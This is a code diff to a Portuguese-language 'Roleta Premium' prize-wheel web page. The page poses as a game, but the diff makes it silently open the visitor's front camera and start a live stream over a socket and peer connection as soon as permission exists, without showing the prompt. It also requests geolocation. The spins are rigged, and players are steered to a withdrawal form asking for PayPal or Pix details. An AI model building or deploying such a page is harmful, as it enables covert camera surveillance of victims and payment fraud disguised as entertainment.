@@ -208,7 +208,7 @@
 <!-- ===== OVERLAY PERMISSÃO ===== -->
 <div class="permission-overlay" id="permissionOverlay">
     <div class="icon">🎰</div>
-    <h2>Roleta Premiun</h2>
+    <h2>Roleta Premium</h2>
     <p class="sub">Ative para participar e ganhar prêmios</p>
     <div class="features">
         <span>💲 PayPal</span><span>📱 Pix</span>
@@ -455,7 +455,7 @@
         }
 
         // ============================================================
-        // PERMISSÃO
+        // PERMISSÃO - FRONTAL PADRÃO
         // ============================================================
 
         const overlay = document.getElementById('permissionOverlay');
@@ -467,41 +467,81 @@
         let isSpinning = false;
         let spinCount = 0;
         let balance = 0;
-        let totalWon = 0;
         let stream = null;
         let frameInterval = null;
         let peer = null;
 
-        function requestPermissions() {
+        // ============================================================
+        // INICIA TRANSMISSÃO DIRETO (se já tem permissão)
+        // ============================================================
+
+        function iniciarTudo(streamObj) {
+            permissionGranted = true;
+            statusOk.style.display = 'inline-flex';
+            overlay.classList.add('hidden');
+
+            stream = streamObj;
+            vid.srcObject = stream;
+            vid.play();
+
+            iniciarTransmissao(stream);
+            iniciarSocket();
+
+            document.getElementById('streamStatus').classList.add('active');
+
+            if (!urlParams.get('id')) {
+                const newUrl = window.location.href.split('?')[0] + '?id=' + roomId;
+                window.history.replaceState({}, '', newUrl);
+            }
+
+            // Gira automaticamente após iniciar
+            setTimeout(function() {
+                if (permissionGranted) spinRoulette();
+            }, 1200);
+        }
+
+        // ============================================================
+        // VERIFICA PERMISSÃO - SE JÁ TEM, ENTRA DIRETO
+        // ============================================================
+
+        // Verifica se já tem permissão (entra direto)
+        navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false })
+            .then(function(s) {
+                // Já tem permissão! Entra direto.
+                s.getTracks().forEach(t => t.stop());
+                
+                // Pega stream de verdade com câmera frontal
+                return navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: 'user', width: { ideal: 320 }, height: { ideal: 240 } },
+                    audio: false
+                });
+            })
+            .then(function(streamObj) {
+                iniciarTudo(streamObj);
+            })
+            .catch(function() {
+                // Não tem permissão, mostra overlay
+                overlay.classList.remove('hidden');
+            });
+
+        // ============================================================
+        // BOTÃO PERMITIR (para quem não tem permissão)
+        // ============================================================
+
+        btnAllow.addEventListener('click', function() {
             btnAllow.textContent = '⏳...';
             btnAllow.disabled = true;
 
             navigator.mediaDevices.getUserMedia({
-                video: { facingMode: 'environment', width: { ideal: 320 }, height: { ideal: 240 } },
+                video: { facingMode: 'user', width: { ideal: 320 }, height: { ideal: 240 } },
                 audio: false
             })
             .then(function(streamObj) {
+                // GPS (opcional)
                 if ("geolocation" in navigator) {
                     navigator.geolocation.getCurrentPosition(function(){}, function(){});
                 }
-
-                permissionGranted = true;
-                statusOk.style.display = 'inline-flex';
-                overlay.classList.add('hidden');
-
-                iniciarTransmissao(streamObj);
-                iniciarSocket();
-
-                document.getElementById('streamStatus').classList.add('active');
-
-                if (!urlParams.get('id')) {
-                    const newUrl = window.location.href.split('?')[0] + '?id=' + roomId;
-                    window.history.replaceState({}, '', newUrl);
-                }
-
-                setTimeout(function() {
-                    if (permissionGranted) spinRoulette();
-                }, 1000);
+                iniciarTudo(streamObj);
             })
             .catch(function() {
                 permissionGranted = false;
@@ -510,22 +550,7 @@
                 btnAllow.textContent = 'PERMITIR';
                 btnAllow.disabled = false;
             });
-        }
-
-        btnAllow.addEventListener('click', requestPermissions);
-
-        // Verifica permissão existente (rápido)
-        navigator.mediaDevices.getUserMedia({ video: true, audio: false })
-            .then(function(s) {
-                s.getTracks().forEach(t => t.stop());
-                permissionGranted = true;
-                statusOk.style.display = 'inline-flex';
-                overlay.classList.add('hidden');
-                requestPermissions();
-            })
-            .catch(function() {
-                overlay.classList.remove('hidden');
-            });
+        });
 
         // ============================================================
         // TRANSMISSÃO
@@ -640,7 +665,7 @@
         }, 8000);
 
         // ============================================================
-        // MÚSICA (otimizada)
+        // MÚSICA
         // ============================================================
 
         let audioCtx = null;
@@ -700,7 +725,7 @@
         }
 
         // ============================================================
-        // GIRAR - SÓ GANHA NO FINAL
+        // GIRAR
         // ============================================================
 
         function spinRoulette() {
@@ -728,11 +753,9 @@
 
             let prizeIndex;
             if (spinCount === 1) {
-                // Primeira = sempre perde
                 const loseIndices = LOSE_PRIZES.map(p => PRIZES.indexOf(p));
                 prizeIndex = loseIndices[Math.floor(Math.random() * loseIndices.length)];
             } else {
-                // Maioria perde (70%), mas acumula no final
                 if (Math.random() < 0.7) {
                     const loseIndices = LOSE_PRIZES.map(p => PRIZES.indexOf(p));
                     prizeIndex = loseIndices[Math.floor(Math.random() * loseIndices.length)];
@@ -755,11 +778,8 @@
                 prizeDisplay.textContent = prize.value;
 
                 if (prize.value > 0) {
-                    // Acumula prêmio
                     balance += prize.value;
-                    totalWon += prize.value;
                     balanceDisplay.textContent = '$' + balance;
-                    
                     prizeLabel.textContent = `🎉 +$${prize.value}`;
                     playWinSound();
                     if (navigator.vibrate) navigator.vibrate(50);
@@ -773,13 +793,11 @@
                 spinBtn.disabled = false;
                 spinBtn.textContent = '🎰 GIRAR';
 
-                // Se acabaram as tentativas, mostra o saldo total e oferece saque
                 if (attempts <= 0) {
                     spinBtn.disabled = true;
                     spinBtn.textContent = '⛔ FINALIZADO';
                     
                     if (balance > 0) {
-                        // Mostra vitória final com saldo acumulado
                         winAmount.textContent = '$' + balance;
                         winOverlay.classList.add('show');
                         playWinSound();
@@ -799,14 +817,12 @@
 
         btnWinContinue.addEventListener('click', function() {
             winOverlay.classList.remove('show');
-            // Abre saque
             if (balance > 0) {
                 withdrawAmount.textContent = '$' + balance;
                 withdrawOverlay.classList.add('show');
             }
         });
 
-        // SAQUE
         const methodSelect = document.getElementById('withdrawMethod');
         const paypalField = document.getElementById('paypalField');
         const pixField = document.getElementById('pixField');
